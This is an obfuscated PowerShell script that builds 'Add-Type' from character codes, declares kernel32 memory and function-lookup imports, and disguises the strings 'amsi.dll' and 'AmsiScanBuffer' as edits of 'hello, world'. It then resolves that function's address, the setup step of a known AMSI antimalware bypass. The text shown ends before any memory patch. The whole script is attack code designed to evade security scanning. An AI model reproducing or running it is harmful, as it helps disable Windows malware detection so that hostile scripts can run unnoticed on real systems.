
$Z3tl6NAo = 0x50000
$iU3W7xjINMVafL7bwJop= 0x50000
$oC5TD9GnehMJzBrTEJk = 0x2000000
$ohFyTO1UCnpi = 0x50000


$6dKOwQJkwbXYEg = @"
using System;
using System.ComponentModel;
using System.Management.Automation;
using System.Reflection;
using System.Runtime.CompilerServices;
using System.Runtime.InteropServices;
using System.Text;

public class APIs {
    [DllImport("kernel32.dll")]
    public static extern bool ReadProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, UInt32 nSize, ref UInt32 lpNumberOfBytesRead);

    [DllImport("kernel32.dll")]
    public static extern IntPtr GetCurrentProcess();

    [DllImport("kernel32", CharSet=CharSet.Ansi, ExactSpelling=true, SetLastError=true)]
    public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);
    
    [DllImport("kernel32.dll", CharSet=CharSet.Auto)]
    public static extern IntPtr GetModuleHandle([MarshalAs(UnmanagedType.LPWStr)] string lpModuleName);

    [MethodImpl(MethodImplOptions.NoOptimization | MethodImplOptions.NoInlining)]
    public static int Dummy() {
   	 return 1;
    }
}
"@

& ([string]::join('', ( (65,100,100,45,84,121,112,101) |%{ ( [char][int] $_)})) | % {$_}) $6dKOwQJkwbXYEg

$howgXAueAt0G3dcCbSejrYxmN=& ([string]::join('', ( (71,101,116,45,68,97,116,101) |%{ ( [char][int] $_)})) | % {$_});

$BDdFr = 'hello, world'
$BDdFr = $BDdFr.replace('he','a')
$BDdFr = $BDdFr.replace('ll','m')
$BDdFr = $BDdFr.replace('o,','s')
$BDdFr = $BDdFr.replace(' ','i')
$BDdFr = $BDdFr.replace('wo','.d')
$BDdFr = $BDdFr.replace('rld','ll')

$THzGlZkcAUd = 'hello, world'
$THzGlZkcAUd = $THzGlZkcAUd.replace('he','A')
$THzGlZkcAUd = $THzGlZkcAUd.replace('ll','m')
$THzGlZkcAUd = $THzGlZkcAUd.replace('o,','s')
$THzGlZkcAUd = $THzGlZkcAUd.replace(' ','i')
$THzGlZkcAUd = $THzGlZkcAUd.replace('wo','Sc')
$THzGlZkcAUd = $THzGlZkcAUd.replace('rld','an')

$msSUO5MI1pZe = 'hello, world'
$msSUO5MI1pZe = $msSUO5MI1pZe.replace('hello','Bu')
$msSUO5MI1pZe = $msSUO5MI1pZe.replace(', ','ff')
$msSUO5MI1pZe = $msSUO5MI1pZe.replace('world','er')

$fDxu3iqvB = [APIS]::GetModuleHandle($BDdFr)
[IntPtr] $gmNIKok2h = [APIS]::GetProcAddress($fDxu3iqvB, $THzGlZkcAUd + $msSUO5MI1pZe)

